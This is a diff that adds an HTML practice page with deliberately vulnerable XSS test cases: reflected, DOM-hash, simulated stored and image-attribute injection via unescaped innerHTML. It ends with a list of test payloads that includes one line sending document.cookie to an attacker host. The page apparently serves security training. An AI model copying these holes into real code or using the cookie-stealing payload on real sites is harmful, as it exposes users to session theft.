@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS Testing Ground</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .test-case {
+            border: 1px solid #ddd;
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        .output {
+            background: #f5f5f5;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <h1>XSS Vulnerability Test Cases</h1>
+    <p>⚠️ WARNING: This page contains intentional XSS vulnerabilities for testing purposes only!</p>
+
+    <div class="test-case">
+        <h3>Test Case 1: Reflected XSS (Basic)</h3>
+        <form onsubmit="return showInput(this, 'output1')">
+            <input type="text" name="userInput" placeholder="Enter some text">
+            <button type="submit">Submit</button>
+        </form>
+        <div id="output1" class="output"></div>
+    </div>
+
+    <div class="test-case">
+        <h3>Test Case 2: DOM-based XSS (URL Fragment)</h3>
+        <p>Try adding #message=&lt;script&gt;alert(1)&lt;/script&gt; to the URL</p>
+        <div id="messageDisplay" class="output"></div>
+    </div>
+
+    <div class="test-case">
+        <h3>Test Case 3: Stored XSS Simulation</h3>
+        <form onsubmit="return storeComment(this)">
+            <textarea name="comment" placeholder="Leave a comment"></textarea><br>
+            <button type="submit">Post Comment</button>
+        </form>
+        <div id="comments" class="output"></div>
+    </div>
+
+    <div class="test-case">
+        <h3>Test Case 4: XSS via HTML Attributes</h3>
+        <form onsubmit="return showImage(this)">
+            <input type="text" name="imageUrl" placeholder="Enter image URL">
+            <button type="submit">Show Image</button>
+        </form>
+        <div id="imageDisplay" class="output"></div>
+    </div>
+
+    <script>
+        // Test Case 1: Reflected XSS
+        function showInput(form, outputId) {
+            // Vulnerable: Direct innerHTML assignment
+            document.getElementById(outputId).innerHTML = 
+                "You entered: " + form.userInput.value;
+            return false;
+        }
+
+        // Test Case 2: DOM-based XSS
+        function loadMessageFromHash() {
+            const hash = location.hash.slice(1);
+            const params = new URLSearchParams(hash);
+            if (params.has('message')) {
+                // Vulnerable: Unescaped hash content
+                document.getElementById('messageDisplay').innerHTML = 
+                    params.get('message');
+            }
+        }
+        window.addEventListener('hashchange', loadMessageFromHash);
+        loadMessageFromHash();
+
+        // Test Case 3: Stored XSS Simulation
+        let comments = [];
+        function storeComment(form) {
+            const comment = form.comment.value;
+            comments.push(comment);
+            // Vulnerable: Storing and displaying raw HTML
+            document.getElementById('comments').innerHTML = 
+                comments.map(c => `<div class="comment">${c}</div>`).join('');
+            form.comment.value = '';
+            return false;
+        }
+
+        // Test Case 4: XSS via HTML Attributes
+        function showImage(form) {
+            // Vulnerable: Direct source assignment without validation
+            const img = document.createElement('img');
+            img.src = form.imageUrl.value;
+            document.getElementById('imageDisplay').innerHTML = '';
+            document.getElementById('imageDisplay').appendChild(img);
+            return false;
+        }
+
+        // Bonus: Vulnerable jQuery-style function (for testing purposes)
+        function $(selector) {
+            return {
+                html: function(content) {
+                    document.querySelector(selector).innerHTML = content;
+                }
+            };
+        }
+    </script>
+
+    <div class="test-case">
+        <h3>Common Test Payloads</h3>
+        <pre>
+Basic XSS:
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+
+HTML Attribute XSS:
+" onmouseover="alert(1)
+javascript:alert(1)
+
+DOM XSS:
+#message=&lt;img src=x onerror=alert(1)&gt;
+
+Stored XSS:
+&lt;script&gt;fetch('https://attacker.com/?cookie='+document.cookie)&lt;/script&gt;
+        </pre>
+    </div>
+</body>
+</html>
